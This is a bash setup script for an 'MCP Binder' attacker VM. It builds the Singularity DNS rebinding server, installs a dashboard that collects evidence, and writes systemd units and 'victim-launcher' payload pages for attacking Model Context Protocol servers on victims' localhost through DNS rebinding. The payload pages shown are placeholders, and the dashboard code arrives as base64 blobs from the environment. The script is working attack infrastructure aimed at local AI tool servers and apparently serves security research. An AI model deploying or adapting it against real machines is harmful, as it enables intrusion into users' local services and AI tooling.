#!/usr/bin/env bash
set -euo pipefail

usage() {
  cat <<'USAGE'
Usage: sudo scripts/setup-attacker-vm.sh --public-ip IP --rebind-domain DOMAIN --dashboard-domain DOMAIN [options]

Installs the MCP Binder operator VM runtime:
  - Singularity of Origin DNS rebinding service
  - MCP Binder dashboard service
  - static launcher payload files
  - systemd units and runtime environment

Required:
  --public-ip IP             Public operator VM IP returned before DNS rebind.
  --rebind-domain DOMAIN     Delegated rebinding domain, e.g. rebind.example.com.
  --dashboard-domain DOMAIN  Static dashboard domain, e.g. dashboard.example.com.

Options:
  --dashboard-port PORT      Dashboard API port. Default: 8090.
  --http-ports RANGE         Singularity HTTP ports. Default: 8080-8089.
  --rebound-ip IP            IP returned after DNS flip. Default: 127.0.0.1.
  --dashboard-token TOKEN    Dashboard bearer token. Generated if omitted.
  --clear-existing           Move any existing install to a timestamped backup first.
  --quiet                    Suppress success summary. Errors still print.
  --help                     Show this help.

Output includes the dashboard token file path. That file is written with mode
0600 and contains the token used by the dashboard.

Optional environment payloads used by SSH deployment wrappers:
  DASHBOARD_SERVER_GZ_B64    gzip+base64 services/dashboard-server.js
  DASHBOARD_SERVER_B64       base64 services/dashboard-server.js
  UI_ARCHIVE_B64             base64 tar.gz of extension UI/source files
USAGE
}

require_value() {
  local value="$1"
  local message="$2"
  if [ -z "$value" ]; then
    echo "$message" >&2
    usage >&2
    exit 2
  fi
}

PUBLIC_IP=""
REBIND_DOMAIN=""
DASHBOARD_DOMAIN=""
DASHBOARD_PORT="8090"
HTTP_PORTS="8080-8089"
REBOUND_IP="127.0.0.1"
DASHBOARD_TOKEN="${MCP_BINDER_DASHBOARD_TOKEN:-}"
CLEAR_EXISTING="false"
QUIET="false"

while [ "$#" -gt 0 ]; do
  case "$1" in
    --public-ip)
      PUBLIC_IP="${2:-}"
      shift 2
      ;;
    --rebind-domain)
      REBIND_DOMAIN="${2:-}"
      shift 2
      ;;
    --dashboard-domain)
      DASHBOARD_DOMAIN="${2:-}"
      shift 2
      ;;
    --dashboard-port)
      DASHBOARD_PORT="${2:-}"
      shift 2
      ;;
    --http-ports)
      HTTP_PORTS="${2:-}"
      shift 2
      ;;
    --rebound-ip)
      REBOUND_IP="${2:-}"
      shift 2
      ;;
    --dashboard-token)
      DASHBOARD_TOKEN="${2:-}"
      shift 2
      ;;
    --clear-existing)
      CLEAR_EXISTING="true"
      shift
      ;;
    --quiet)
      QUIET="true"
      shift
      ;;
    --help|-h)
      usage
      exit 0
      ;;
    *)
      echo "unknown option: $1" >&2
      usage >&2
      exit 2
      ;;
  esac
done

require_value "$PUBLIC_IP" "--public-ip is required"
require_value "$REBIND_DOMAIN" "--rebind-domain is required"
require_value "$DASHBOARD_DOMAIN" "--dashboard-domain is required"

if [ "$(id -u)" -ne 0 ]; then
  echo "setup-attacker-vm.sh must run as root" >&2
  exit 1
fi

APP_ROOT="/opt/mcp_binder"
DASHBOARD_ROOT="/var/lib/mcp_binder"
PAYLOAD_BASE="/opt/singularity-payloads"
PAYLOAD_ROOT="$PAYLOAD_BASE/html"
SINGULARITY_ROOT="/opt/singularity"
ENV_DIR="/etc/mcp_binder"
ENV_FILE="$ENV_DIR/env"
DASHBOARD_TOKEN_FILE="$ENV_DIR/dashboard-token"
BACKUP_ROOT="/opt/mcp-binder-backups"
GO_VERSION="${GO_VERSION:-1.22.4}"
PROGRESS_OFFSET="${MCP_BINDER_PROGRESS_OFFSET:-0}"
PROGRESS_TOTAL="${MCP_BINDER_PROGRESS_TOTAL:-4}"

main() {
  if [ "$CLEAR_EXISTING" = "true" ]; then
    note "Moving existing runtime to backup"
    clear_existing_install
  fi

  progress 1 "Installing system packages"
  install_packages
  install_go

  progress 2 "Building Singularity runtime"
  install_singularity

  progress 3 "Installing dashboard and payload services"
  install_app_files
  install_payloads
  write_runtime_env
  write_systemd_units

  progress 4 "Starting services"
  start_services
  print_status
}

progress() {
  local step="$1"
  local label="$2"
  printf '• [%s/%s] %s\n' "$((PROGRESS_OFFSET + step))" "$PROGRESS_TOTAL" "$label"
}

note() {
  printf '• %s\n' "$1"
}

clear_existing_install() {
  local stamp backup
  stamp="$(date -u +%Y%m%dT%H%M%SZ)"
  backup="$BACKUP_ROOT/$stamp"
  mkdir -p "$backup"

  systemctl stop singularity.service mcp-binder-dashboard.service 2>/dev/null || true
  systemctl disable singularity.service mcp-binder-dashboard.service 2>/dev/null || true

  move_if_exists "$SINGULARITY_ROOT" "$backup/singularity"
  move_if_exists "$PAYLOAD_BASE" "$backup/singularity-payloads"
  move_if_exists "$DASHBOARD_ROOT" "$backup/mcp-binder-data"
  move_if_exists "$APP_ROOT" "$backup/mcp_binder"
  move_if_exists "$ENV_DIR" "$backup/mcp-binder-env"
  move_if_exists "/etc/systemd/system/singularity.service" "$backup/singularity.service"
  move_if_exists "/etc/systemd/system/mcp-binder-dashboard.service" "$backup/mcp-binder-dashboard.service"
  systemctl daemon-reload
}

install_packages() {
  if command -v apt-get >/dev/null 2>&1; then
    export DEBIAN_FRONTEND=noninteractive
    apt-get update -qq
    install_missing_packages apt-get
    return
  fi

  if command -v dnf >/dev/null 2>&1; then
    install_missing_packages dnf
    return
  fi

  if command -v yum >/dev/null 2>&1; then
    install_missing_packages yum
    return
  fi

  echo "no supported package manager found. Install ca-certificates, curl, git, gzip, nodejs, npm, python3, and tar manually, then rerun setup." >&2
  exit 1
}

install_missing_packages() {
  local manager="$1"
  shift || true
  local missing_packages=()

  add_package_if_missing missing_packages update-ca-trust ca-certificates
  add_package_if_missing missing_packages curl curl
  add_package_if_missing missing_packages git git
  add_package_if_missing missing_packages gzip gzip
  add_package_if_missing missing_packages node nodejs
  add_package_if_missing missing_packages npm npm
  add_package_if_missing missing_packages python3 python3
  add_package_if_missing missing_packages tar tar

  if [ "${#missing_packages[@]}" -eq 0 ]; then
    return
  fi

  case "$manager" in
    apt-get)
      apt-get install -y -qq "${missing_packages[@]}"
      ;;
    dnf)
      dnf install -y -q "${missing_packages[@]}"
      ;;
    yum)
      yum install -y -q "${missing_packages[@]}"
      ;;
    *)
      echo "unsupported package manager: $manager" >&2
      exit 1
      ;;
  esac
}

add_package_if_missing() {
  local -n output="$1"
  local command_name="$2"
  local package_name="$3"
  if ! command -v "$command_name" >/dev/null 2>&1; then
    output+=("$package_name")
  fi
}

install_go() {
  if command -v go >/dev/null 2>&1; then
    return
  fi

  if [ ! -d /usr/local/go ]; then
    curl -fsSL "https://go.dev/dl/go${GO_VERSION}.linux-amd64.tar.gz" | tar -C /usr/local -xz
  fi
  ln -sf /usr/local/go/bin/go /usr/local/bin/go
  ln -sf /usr/local/go/bin/gofmt /usr/local/bin/gofmt
}

install_singularity() {
  export PATH="/usr/local/go/bin:/usr/local/bin:/usr/bin:/bin"
  export HOME=/root
  export GOPATH=/root/go
  export GOMODCACHE=/root/go/pkg/mod
  export GOCACHE=/root/.cache/go-build
  mkdir -p "$GOMODCACHE" "$GOCACHE"

  if [ ! -d "$SINGULARITY_ROOT/.git" ]; then
    if [ -e "$SINGULARITY_ROOT" ]; then
      move_if_exists "$SINGULARITY_ROOT" "$SINGULARITY_ROOT.previous.$(date -u +%Y%m%dT%H%M%SZ)"
    fi
    git clone --quiet --depth 1 https://github.com/nccgroup/singularity.git "$SINGULARITY_ROOT"
  fi

  cd "$SINGULARITY_ROOT"
  go build -o /usr/local/bin/singularity-server ./cmd/singularity-server/
}

install_app_files() {
  mkdir -p "$APP_ROOT/services" "$APP_ROOT/ui" "$APP_ROOT/src"
  write_package_json

  if [ -n "${DASHBOARD_SERVER_GZ_B64:-}" ]; then
    printf '%s' "$DASHBOARD_SERVER_GZ_B64" | base64 -d | gzip -d > "$APP_ROOT/services/dashboard-server.js"
  elif [ -n "${DASHBOARD_SERVER_B64:-}" ]; then
    printf '%s' "$DASHBOARD_SERVER_B64" | base64 -d > "$APP_ROOT/services/dashboard-server.js"
  elif [ -f "$PWD/services/dashboard-server.js" ]; then
    cp "$PWD/services/dashboard-server.js" "$APP_ROOT/services/dashboard-server.js"
  else
    echo "DASHBOARD_SERVER_B64 is required when services/dashboard-server.js is not present" >&2
    exit 1
  fi

  if [ -n "${UI_ARCHIVE_B64:-}" ]; then
    printf '%s' "$UI_ARCHIVE_B64" | base64 -d | tar -C "$APP_ROOT" -xzf -
  fi
}

install_payloads() {
  mkdir -p "$PAYLOAD_ROOT/payloads"
  cp -r "$SINGULARITY_ROOT/html/." "$PAYLOAD_ROOT/"
  write_victim_launcher "$PAYLOAD_ROOT/payloads/victim-launcher.html"
  write_auto_payload "$PAYLOAD_ROOT/payloads/auto-streamable.html" "streamable"
  write_auto_payload "$PAYLOAD_ROOT/payloads/auto-sse.html" "sse"
  write_auto_payload "$PAYLOAD_ROOT/payloads/auto-ws.html" "websocket"
}

write_runtime_env() {
  mkdir -p "$ENV_DIR" "$DASHBOARD_ROOT/evidence"

  if [ -z "$DASHBOARD_TOKEN" ]; then
    if command -v openssl >/dev/null 2>&1; then
      DASHBOARD_TOKEN="$(openssl rand -hex 24)"
    else
      DASHBOARD_TOKEN="token-$(date -u +%s)"
    fi
  fi

  printf '%s\n' "$DASHBOARD_TOKEN" > "$DASHBOARD_TOKEN_FILE"
  chmod 0600 "$DASHBOARD_TOKEN_FILE"

  cat > "$ENV_FILE" <<ENV
MCP_BINDER_FRAMEWORK_VERSION=0.1.0
MCP_BINDER_PUBLIC_IP=$PUBLIC_IP
MCP_BINDER_REBIND_DOMAIN=$REBIND_DOMAIN
MCP_BINDER_DASHBOARD_FQDN=$DASHBOARD_DOMAIN
MCP_BINDER_DASHBOARD_PORT=$DASHBOARD_PORT
MCP_BINDER_DASHBOARD_BASE_URL=http://$DASHBOARD_DOMAIN:$DASHBOARD_PORT
MCP_BINDER_EVIDENCE_DIR=$DASHBOARD_ROOT/evidence
MCP_BINDER_HTTP_PORTS=$HTTP_PORTS
MCP_BINDER_RESPONSE_REBOUND_IP=$REBOUND_IP
MCP_BINDER_DASHBOARD_TOKEN=$DASHBOARD_TOKEN
ENV
  chmod 0600 "$ENV_FILE"
}

write_systemd_units() {
  local private_ip http_args
  private_ip="$(hostname -I | awk '{print $1}')"
  http_args="$(http_port_args "$HTTP_PORTS")"

  cat > /etc/systemd/system/singularity.service <<SERVICE
[Unit]
Description=MCP Binder Singularity DNS rebinding service
After=network-online.target
Wants=network-online.target

[Service]
EnvironmentFile=$ENV_FILE
WorkingDirectory=$PAYLOAD_BASE
ExecStart=/usr/local/bin/singularity-server -DNSServerBindAddr $private_ip -ResponseIPAddr \${MCP_BINDER_PUBLIC_IP} -ResponseReboundIPAddr \${MCP_BINDER_RESPONSE_REBOUND_IP} $http_args
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
SERVICE

  cat > /etc/systemd/system/mcp-binder-dashboard.service <<SERVICE
[Unit]
Description=MCP Binder dashboard
After=network-online.target
Wants=network-online.target

[Service]
EnvironmentFile=$ENV_FILE
WorkingDirectory=$APP_ROOT
ExecStart=/usr/bin/env node $APP_ROOT/services/dashboard-server.js --host 0.0.0.0 --port \${MCP_BINDER_DASHBOARD_PORT} --evidence-dir \${MCP_BINDER_EVIDENCE_DIR}
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
SERVICE

  systemctl daemon-reload
}

start_services() {
  systemctl enable --now singularity.service mcp-binder-dashboard.service >/dev/null
  systemctl restart singularity.service mcp-binder-dashboard.service >/dev/null
}

print_status() {
  if [ "$QUIET" = "true" ]; then
    systemctl is-active --quiet singularity.service
    systemctl is-active --quiet mcp-binder-dashboard.service
    return
  fi

  echo "✓ MCP Binder VM runtime installed"
  echo "  Dashboard: http://$DASHBOARD_DOMAIN:$DASHBOARD_PORT"
  echo "  Public IP: $PUBLIC_IP"
  echo "  Rebind domain: $REBIND_DOMAIN"
  echo "  Token file: $DASHBOARD_TOKEN_FILE"
  echo "  Payloads: victim-launcher.html, auto-streamable.html, auto-sse.html, auto-ws.html"
  systemctl is-active --quiet singularity.service
  systemctl is-active --quiet mcp-binder-dashboard.service
  echo "  Services: singularity active, dashboard active"
}

write_package_json() {
  cat > "$APP_ROOT/package.json" <<'JSON'
{
  "name": "mcp-binder-vm-runtime",
  "private": true,
  "type": "module"
}
JSON
}

write_victim_launcher() {
  local file="$1"
  cat > "$file" <<'HTML'
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>MCP Binder Launch</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
body{font-family:system-ui,sans-serif;margin:3rem;line-height:1.4;color:#111}
code{background:#f4f1d0;padding:.15rem .3rem;border-radius:.25rem}
</style>
</head>
<body>
<h1>MCP Binder launch page</h1>
<p>This host is controlled by the rebinding provider. The extension attack bridge uses the generated same-origin probe URL for MCP verification.</p>
<pre id="state"></pre>
<script>
document.getElementById("state").textContent = JSON.stringify({
  href: location.href,
  host: location.host,
  search: Object.fromEntries(new URLSearchParams(location.search))
}, null, 2);
</script>
</body>
</html>
HTML
}

write_auto_payload() {
  local file="$1"
  local transport="$2"
  cat > "$file" <<HTML
<!doctype html>
<html lang="en">
<head><meta charset="utf-8"><title>MCP Binder ${transport}</title></head>
<body>
<h1>MCP Binder ${transport} payload placeholder</h1>
<p>The Chrome extension offscreen bridge performs the active MCP attack for this framework build.</p>
</body>
</html>
HTML
}

http_port_args() {
  local spec="$1"
  local args="" part start end port
  IFS=',' read -ra parts <<< "$spec"
  for part in "${parts[@]}"; do
    if [[ "$part" == *-* ]]; then
      start="${part%-*}"
      end="${part#*-}"
      for ((port=start; port<=end; port++)); do
        args="$args -HTTPServerPort $port"
      done
    else
      args="$args -HTTPServerPort $part"
    fi
  done
  printf '%s' "$args"
}

move_if_exists() {
  local source="$1"
  local target="$2"
  if [ -e "$source" ]; then
    mkdir -p "$(dirname "$target")"
    mv "$source" "$target"
  fi
}

main
